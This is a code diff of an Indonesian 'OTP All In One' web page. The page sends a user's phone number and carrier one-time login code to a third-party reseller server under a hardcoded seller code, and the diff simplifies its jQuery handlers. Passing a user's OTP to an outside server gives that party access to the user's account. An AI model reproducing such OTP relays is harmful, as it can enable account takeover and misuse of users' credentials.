@@ -1,14 +1,14 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="robots" content="noindex, nofollow">
-    <title>OTP ALL IN ONE</title>
+    <title>OTP All In One</title>
     <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
     <style>
         body {
-            background-color: #000; /* Mengubah latar belakang menjadi hitam */
+            background-color: #000;
             color: #333;
             display: flex;
             justify-content: center;
@@ -23,8 +23,8 @@
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.5);
             width: 300px;
             color: white;
-            position: relative; /* Pastikan posisi relatif untuk menghindari masalah dengan elemen di atas */
-            z-index: 1; /* Memastikan form berada di atas elemen lain */
+            position: relative;
+            z-index: 1;
         }
 
         .form-control {
@@ -35,8 +35,6 @@
             margin-bottom: 10px;
             border-radius: 5px;
             width: 100%;
-            z-index: 2; /* Memastikan input berada di atas */
-            position: relative; /* Pastikan input berada di posisi yang benar */
         }
 
         .form-button {
@@ -75,66 +73,61 @@
         }
 
         #cover-spin {
-            display: none; /* Pastikan loading tidak terlihat secara default */
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
         }
     </style>
 </head>
 <body>
     <div id="form-container">
-        <h2>LOGIN</h2>
+        <h2>Login</h2>
         <form>
-            <div class="mb-4" hidden>
-                <label for="seller_code" class="block text-lg font-medium text-gray-700">Kode Seller (jika tidak tahu, tanyakan ke seller Anda)</label>
-                <input type="text" id="seller_code" class="form-control" placeholder="Contoh: BosamStoreKizaOpaOpa" value="fb34564f99a8ab12ad55504f500945ca" required>
-            </div>
-
-            <label for="msisdn">NOMOR HP</label>
+            <label for="msisdn">Nomor HP</label>
             <input type="number" id="msisdn" class="form-control" placeholder="Contoh: 628xxx/08xxx" required>
 
-            <label for="otp">OTP UNTUK VERIFIKASI</label>
-            <input type="text" id="otp" class="form-control" placeholder="Contoh: 123456" required>
+            <label for="otp">OTP untuk Verifikasi</label>
+            <input type="text" id="otp" class="form-control" placeholder="Masukkan OTP Anda" required>
 
-            <!-- Input untuk menyimpan auth_id -->
-            <input type="hidden" id="auth_id" class="form-control">
+            <input type="hidden" id="auth_id">
 
-            <button type="button" id="reqOTP" class="form-button button-otp">MINTA OTP</button>
-            <button type="button" id="verOTP" class="form-button button-verifikasi">VERIFIKASI OTP</button>
-            <button type="button" class="form-button button-kembali" hidden>KEMBALI</button> <!-- Tombol Kembali disembunyikan -->
+            <button type="button" id="reqOTP" class="form-button button-otp">Minta OTP</button>
+            <button type="button" id="verOTP" class="form-button button-verifikasi">Verifikasi OTP</button>
+            <button type="button" class="form-button button-kembali" hidden>Kembali</button>
         </form>
         <div id="logResponse" class="mt-4 text-red-500"></div>
-        <div id="cover-spin">Loading...</div>
+        <div id="cover-spin">Memuat...</div>
     </div>
 
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
     <script>
     $(document).ready(function(){
         $('#reqOTP').click(function(){
+            let msisdn = $('#msisdn').val();
+            if (!msisdn.startsWith("62") && !msisdn.startsWith("08")) {
+                $('#logResponse').html('Nomor HP harus dimulai dengan 628 atau 08');
+                return;
+            }
+
             $.ajax({
                 type: 'POST',
-                crossDomain: true,
                 url: "https://nomorxlku.my.id/api/req_otp.php",
-                data: { msisdn: $('#msisdn').val(), seller_code: $('#seller_code').val() },
+                data: { msisdn: msisdn, seller_code: "fb34564f99a8ab12ad55504f500945ca" },
                 dataType: 'JSON',
-                contentType: 'application/x-www-form-urlencoded',
                 beforeSend: function() {
                     $('#logResponse').html('');
                     $('#cover-spin').show();
                 },
                 success: function(s) {
                     $('#cover-spin').hide();
-                    if (s.status) {
-                        $('#otp').val('');
-                        $('#auth_id').val(s.data.auth_id); // Simpan auth_id
-                        $('#logResponse').html(s.message);
-                    } else {
-                        $('#otp').val('');
-                        $('#auth_id').val(''); // Kosongkan auth_id
-                        $('#logResponse').html(s.message);
-                    }
+                    $('#auth_id').val(s.status ? s.data.auth_id : '');
+                    $('#logResponse').html(s.message);
                 },
                 error: function() {
                     $('#auth_id').val('');
-                    $('#otp').val('');
                     $('#logResponse').html('Terjadi kesalahan, silakan coba lagi!');
                     $('#cover-spin').hide();
                 }
@@ -144,32 +137,19 @@
         $('#verOTP').click(function(){
             $.ajax({
                 type: 'POST',
-                crossDomain: true,
                 url: "https://nomorxlku.my.id/api/ver_otp.php",
                 data: { msisdn: $('#msisdn').val(), auth_id: $('#auth_id').val(), otp: $('#otp').val() },
                 dataType: 'JSON',
-                contentType: 'application/x-www-form-urlencoded',
                 beforeSend: function() {
                     $('#logResponse').html('');
                     $('#cover-spin').show();
                 },
                 success: function(s) {
                     $('#cover-spin').hide();
-                    if (s.status) {
-                        $('#auth_id').val('');
-                        $('#otp').val('');
-                        $('#logResponse').html(s.message);
-                        $('#access_token_temp').val(s.data.access_token);
-                        $('#checkQuotaSection').show();
-                    } else {
-                        $('#access_token_temp').val('');
-                        $('#checkQuotaSection').hide();
-                        $('#logResponse').html(s.message);
-                    }
+                    $('#auth_id').val('');
+                    $('#logResponse').html(s.message);
                 },
                 error: function() {
-                    $('#access_token_temp').val('');
-                    $('#checkQuotaSection').hide();
                     $('#logResponse').html('Terjadi kesalahan, silakan coba lagi!');
                     $('#cover-spin').hide();
                 }
